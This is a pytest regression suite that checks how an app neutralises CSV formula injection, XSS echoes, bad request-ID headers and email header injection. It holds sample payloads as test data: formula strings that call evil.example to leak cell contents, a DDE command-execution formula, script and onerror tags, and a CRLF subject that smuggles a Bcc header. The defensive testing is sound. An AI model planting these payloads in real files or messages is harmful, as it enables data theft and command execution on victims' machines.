"""Regression tests for issues found in the security review.

Each test here exists because the behaviour it asserts was wrong at some point, so
they are worth keeping even though they look narrow.
"""

from __future__ import annotations

import csv
import io
from datetime import timedelta

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import func, select
from sqlalchemy.orm import Session

from app.db.base import utcnow
from app.models.audit import Notification
from app.models.auth import LoginAttempt
from app.models.enums import EntityType, Severity
from app.models.limits import CreditLimit
from app.services import delivery, limits_csv, retention
from app.services.audit import AuditActor

ACTOR = AuditActor.system("test")

# The classic spreadsheet formula payloads.
FORMULA_PAYLOADS = [
    "=1+1",
    '=HYPERLINK("http://evil.example/?leak="&A1,"click")',
    "+1+1",
    "-1+1",
    "@SUM(1:9)",
    "=cmd|'/c calc'!A1",
]


class TestCsvFormulaInjection:
    """A project named =HYPERLINK(...) must not execute when the export is opened.

    Entity labels come from the Checkmarx tenant, so their content is not ours to
    trust, and an export is opened in Excel or Sheets by definition.
    """

    @pytest.mark.parametrize("payload", FORMULA_PAYLOADS)
    def test_dangerous_labels_are_neutralised(self, db: Session, payload: str) -> None:
        db.add(
            CreditLimit(
                entity_type=EntityType.PROJECT,
                entity_id="proj-1",
                entity_label=payload,
                credit_limit=10,
                period_type="monthly",
            )
        )
        db.commit()

        content = limits_csv.export_limits(db)
        rows = list(csv.reader(io.StringIO(content)))
        label_cell = rows[1][2]
        # The property that matters: no exported cell may begin with a character
        # that makes a spreadsheet evaluate it.
        assert not label_cell.startswith(("=", "+", "-", "@", "\t", "\r"))
        # The text is still readable, just prefixed.
        assert label_cell == f"'{payload}"

    def test_dangerous_notes_are_neutralised(self, db: Session) -> None:
        db.add(
            CreditLimit(
                entity_type=EntityType.USER,
                entity_id="user-1",
                entity_label="Ordinary Name",
                credit_limit=10,
                period_type="monthly",
                notes='=WEBSERVICE("http://evil.example")',
            )
        )
        db.commit()
        assert "'=WEBSERVICE" in limits_csv.export_limits(db)

    def test_ordinary_values_are_left_alone(self, db: Session) -> None:
        db.add(
            CreditLimit(
                entity_type=EntityType.PROJECT,
                entity_id="proj-2",
                entity_label="payments/api",
                credit_limit=10,
                period_type="monthly",
                notes="Owned by the payments team",
            )
        )
        db.commit()
        content = limits_csv.export_limits(db)
        assert "'payments/api" not in content
        assert "payments/api" in content
        assert "Owned by the payments team" in content

    def test_numeric_columns_stay_numeric(self, db: Session) -> None:
        """A guard that quoted the numbers would break re-import."""
        db.add(
            CreditLimit(
                entity_type=EntityType.PROJECT,
                entity_id="proj-3",
                entity_label="ok",
                credit_limit=250,
                period_type="monthly",
                warning_threshold_pct=75,
            )
        )
        db.commit()
        row = limits_csv.export_limits(db).splitlines()[1].split(",")
        assert row[3] == "250"
        assert row[5] == "75"

    def test_a_round_trip_restores_the_original_value(self, db: Session) -> None:
        from app.models.org import CxProject

        db.add(CxProject(id="=proj-odd", name="=Odd Project", is_deleted=False))
        db.add(
            CreditLimit(
                entity_type=EntityType.PROJECT,
                entity_id="=proj-odd",
                entity_label="=Odd Project",
                credit_limit=10,
                period_type="monthly",
                notes="=note",
            )
        )
        db.commit()

        exported = limits_csv.export_limits(db)
        db.query(CreditLimit).delete()
        db.commit()

        result = limits_csv.import_limits(db, content=exported, actor=ACTOR, dry_run=False)
        db.commit()

        assert result.errors == []
        restored = db.scalar(select(CreditLimit))
        assert restored is not None
        assert restored.entity_id == "=proj-odd"
        assert restored.notes == "=note"

    def test_the_export_endpoint_is_neutralised_too(
        self, admin_client: TestClient, db: Session
    ) -> None:
        db.add(
            CreditLimit(
                entity_type=EntityType.PROJECT,
                entity_id="proj-4",
                entity_label="=1+1",
                credit_limit=10,
                period_type="monthly",
            )
        )
        db.commit()
        body = admin_client.get("/api/limits/export").text
        assert "'=1+1" in body


class TestCsvImportEchoIsNotRenderable:
    """The import reports bad rows by quoting the offending cell back. That echo is
    a JSON body the SPA renders as text, never HTML: these headers are what keeps a
    hostile cell from being interpreted by a browser that opens the response."""

    def test_a_script_in_a_cell_comes_back_as_inert_json(self, admin_client: TestClient) -> None:
        payload = "<script>alert(document.domain)</script>"
        response = admin_client.post(
            "/api/limits/import?dry_run=true",
            files={"file": ("limits.csv", f"entity_type,entity_id,credit_limit\n{payload},x,1\n")},
        )
        assert response.status_code == 200
        assert response.headers["content-type"].startswith("application/json")
        assert response.headers["x-content-type-options"] == "nosniff"
        assert "script-src 'self'" in response.headers["content-security-policy"]
        assert any(payload in error for error in response.json()["errors"])

    def test_the_export_is_a_csv_download(self, admin_client: TestClient, db: Session) -> None:
        db.add(
            CreditLimit(
                entity_type=EntityType.PROJECT,
                entity_id="proj-1",
                entity_label="<img src=x onerror=alert(1)>",
                credit_limit=10,
                period_type="monthly",
            )
        )
        db.commit()
        response = admin_client.get("/api/limits/export")
        assert response.headers["content-type"].startswith("text/csv")
        assert response.headers["content-disposition"].startswith("attachment;")
        assert response.headers["x-content-type-options"] == "nosniff"


class TestRequestIdHeader:
    """X-Request-ID is echoed in the response, in error bodies and in the log."""

    def test_a_well_formed_id_is_kept(self, client: TestClient) -> None:
        response = client.get("/healthz", headers={"X-Request-ID": "abc-123_DEF.4"})
        assert response.headers["x-request-id"] == "abc-123_DEF.4"

    @pytest.mark.parametrize("value", ["<script>", "a" * 65, "id with spaces", "a;b"])
    def test_anything_else_is_replaced(self, client: TestClient, value: str) -> None:
        response = client.get("/healthz", headers={"X-Request-ID": value})
        echoed = response.headers["x-request-id"]
        assert echoed != value
        assert len(echoed) == 12 and echoed.isalnum()


class TestEmailHeaderInjection:
    """A notification title is built from tenant data, so it cannot be trusted in a
    mail header."""

    def test_newlines_in_a_title_cannot_split_the_subject(self) -> None:
        config = delivery.DeliveryConfig(
            min_severity=Severity.WARNING,
            smtp_host="smtp.example.com",
            smtp_port=587,
            smtp_username=None,
            smtp_password=None,
            smtp_use_tls=True,
            smtp_from="cxcg@example.com",
            smtp_recipients=("ops@example.com",),
            webhook_url=None,
            webhook_secret=None,
            tenant_name="acme",
        )
        notification = Notification(
            id=1,
            created_at=utcnow(),
            severity=Severity.CRITICAL,
            category="enforcement",
            title="Restricted\r\nBcc: attacker@evil.example\r\nX-Injected: yes",
            body="body",
        )

        message = delivery.build_email(notification, config=config)

        # The payload survives as inert text on a single Subject line. What must not
        # happen is it becoming headers of its own.
        subject = message["Subject"]
        assert "\n" not in subject
        assert "\r" not in subject
        assert message.get("Bcc") is None
        assert message.get("X-Injected") is None
        # And the message still serialises, which a raw newline would break.
        headers = message.as_string().split("\n\n", 1)[0]
        assert "attacker@evil.example" in headers  # inside Subject, harmlessly
        assert "\nBcc:" not in headers
        assert "\nX-Injected:" not in headers

    def test_a_long_title_is_truncated_not_wrapped_into_a_new_header(self) -> None:
        assert len(delivery._header_safe("x" * 500)) == 200

    def test_whitespace_is_collapsed(self) -> None:
        assert delivery._header_safe("a\t\tb   c") == "a b c"


class TestLoginAttemptGrowth:
    """The rate limit table is fed by unauthenticated input, so it has to be bounded."""

    def test_stale_counters_are_pruned(self, db: Session) -> None:
        db.add(
            LoginAttempt(
                identifier="attacker",
                ip_address="203.0.113.9",
                window_started_at=utcnow() - timedelta(days=3),
                attempt_count=99,
                last_attempt_at=utcnow() - timedelta(days=3),
            )
        )
        db.commit()

        result = retention.prune(db, retention_days=365, actor=ACTOR)
        db.commit()

        assert result.login_attempts == 1
        assert db.scalar(select(func.count()).select_from(LoginAttempt)) == 0

    def test_a_live_counter_survives(self, db: Session) -> None:
        """Pruning a counter that is still inside its window would reset the limit."""
        db.add(
            LoginAttempt(
                identifier="admin",
                ip_address="203.0.113.9",
                window_started_at=utcnow(),
                attempt_count=4,
                last_attempt_at=utcnow(),
            )
        )
        db.commit()
        result = retention.prune(db, retention_days=365, actor=ACTOR)
        db.commit()
        assert result.login_attempts == 0
        assert db.scalar(select(func.count()).select_from(LoginAttempt)) == 1

    def test_rate_limiting_still_works_after_a_prune(self, client: TestClient, db: Session) -> None:
        from app.core.config import get_settings

        settings = get_settings()
        for _ in range(settings.login_rate_limit_per_minute + 2):
            client.post("/api/auth/login", json={"username": "nobody", "password": "wrong-one"})
        retention.prune(db, retention_days=365, actor=ACTOR)
        db.commit()
        response = client.post(
            "/api/auth/login", json={"username": "nobody", "password": "wrong-one"}
        )
        assert response.status_code == 429
